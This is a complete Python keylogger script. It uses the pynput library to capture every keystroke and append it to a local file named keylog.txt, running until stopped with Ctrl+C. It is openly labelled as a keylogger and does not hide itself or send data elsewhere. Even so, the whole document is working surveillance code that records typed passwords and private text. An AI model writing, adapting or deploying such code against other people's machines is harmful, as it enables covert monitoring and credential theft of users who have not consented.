from pynput.keyboard import Listener

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            # Write the key to the file, with additional formatting if needed
            if hasattr(key, 'char'):
                log_file.write(key.char)
            elif key == key.space:
                log_file.write(" ")
            else:
                log_file.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Keylogger started... (press CTRL+C to stop)")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
